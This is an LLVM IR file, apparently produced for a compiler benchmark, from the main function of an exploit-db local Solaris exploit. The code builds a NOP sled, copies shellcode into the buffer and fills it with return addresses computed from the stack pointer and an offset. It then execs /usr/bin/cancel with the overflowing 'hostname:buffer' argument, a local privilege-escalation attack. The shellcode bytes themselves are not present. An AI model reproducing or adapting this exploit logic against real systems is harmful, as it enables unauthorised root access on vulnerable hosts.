; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19234.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19234.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [29 x i8] c"usage: %s hostname [offset]\0A\00", align 1
@esp = common dso_local global i32 0, align 4
@offset = common dso_local global i32 0, align 4
@nop = common dso_local global i32 0, align 4
@buf = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFLEN = common dso_local global i32 0, align 4
@shell = common dso_local global i8* null, align 8
@egg = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [16 x i8] c"malloc failed!\0A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"%s:%s\00", align 1
@.str.3 = private unnamed_addr constant [47 x i8] c"jumping to 0x%08x (0x%08x offset %d) [nop %d]\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"/usr/bin/cancel\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"cancel\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"exec failed!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = icmp slt i32 %6, 2
  br i1 %7, label %8, label %13

8:                                                ; preds = %2
  %9 = load i8**, i8*** %4, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 0
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8* %11)
  br label %104

13:                                               ; preds = %2
  %14 = call i32 (...) @get_esp()
  store i32 %14, i32* @esp, align 4
  %15 = load i32, i32* %3, align 4
  %16 = icmp sgt i32 %15, 2
  br i1 %16, label %17, label %22

17:                                               ; preds = %13
  %18 = load i8**, i8*** %4, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 2
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @strtol(i8* %20, i32* null, i32 0)
  store i32 %21, i32* @offset, align 4
  br label %22

22:                                               ; preds = %17, %13
  %23 = load i32, i32* %3, align 4
  %24 = icmp sgt i32 %23, 3
  br i1 %24, label %25, label %30

25:                                               ; preds = %22
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 3
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @strtoul(i8* %28, i32* null, i32 0)
  store i32 %29, i32* @nop, align 4
  br label %31

30:                                               ; preds = %22
  store i32 933, i32* @nop, align 4
  br label %31

31:                                               ; preds = %30, %25
  %32 = load i8*, i8** @buf, align 8
  %33 = load i32, i32* @NOP, align 4
  %34 = load i32, i32* @BUFLEN, align 4
  %35 = call i32 @memset(i8* %32, i32 %33, i32 %34)
  %36 = load i8*, i8** @buf, align 8
  %37 = load i32, i32* @nop, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8*, i8** @shell, align 8
  %41 = load i8*, i8** @shell, align 8
  %42 = call i32 @strlen(i8* %41)
  %43 = call i32 @memcpy(i8* %39, i8* %40, i32 %42)
  %44 = load i32, i32* @nop, align 4
  %45 = load i8*, i8** @shell, align 8
  %46 = call i32 @strlen(i8* %45)
  %47 = add nsw i32 %44, %46
  store i32 %47, i32* %5, align 4
  br label %48

48:                                               ; preds = %62, %31
  %49 = load i32, i32* %5, align 4
  %50 = load i32, i32* @BUFLEN, align 4
  %51 = sub nsw i32 %50, 4
  %52 = icmp sle i32 %49, %51
  br i1 %52, label %53, label %65

53:                                               ; preds = %48
  %54 = load i32, i32* @esp, align 4
  %55 = load i32, i32* @offset, align 4
  %56 = add nsw i32 %54, %55
  %57 = load i8*, i8** @buf, align 8
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = bitcast i8* %60 to i32*
  store i32 %56, i32* %61, align 4
  br label %62

62:                                               ; preds = %53
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, 4
  store i32 %64, i32* %5, align 4
  br label %48

65:                                               ; preds = %48
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strlen(i8* %68)
  %70 = add nsw i32 %69, 1
  %71 = load i32, i32* @BUFLEN, align 4
  %72 = add nsw i32 %70, %71
  %73 = add nsw i32 %72, 1
  %74 = call i64 @malloc(i32 %73)
  %75 = inttoptr i64 %74 to i8*
  store i8* %75, i8** @egg, align 8
  %76 = icmp eq i8* %75, null
  br i1 %76, label %77, label %79

77:                                               ; preds = %65
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  br label %104

79:                                               ; preds = %65
  %80 = load i8*, i8** @egg, align 8
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 1
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @strlen(i8* %83)
  %85 = add nsw i32 %84, 1
  %86 = load i32, i32* @BUFLEN, align 4
  %87 = add nsw i32 %85, %86
  %88 = add nsw i32 %87, 1
  %89 = load i8**, i8*** %4, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 1
  %91 = load i8*, i8** %90, align 8
  %92 = load i8*, i8** @buf, align 8
  %93 = call i32 @snprintf(i8* %80, i32 %88, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %91, i8* %92)
  %94 = load i32, i32* @esp, align 4
  %95 = load i32, i32* @offset, align 4
  %96 = add nsw i32 %94, %95
  %97 = load i32, i32* @esp, align 4
  %98 = load i32, i32* @offset, align 4
  %99 = load i32, i32* @nop, align 4
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0), i32 %96, i32 %97, i32 %98, i32 %99)
  %101 = load i8*, i8** @egg, align 8
  %102 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i8* %101, i32* null)
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  br label %104

104:                                              ; preds = %79, %77, %8
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
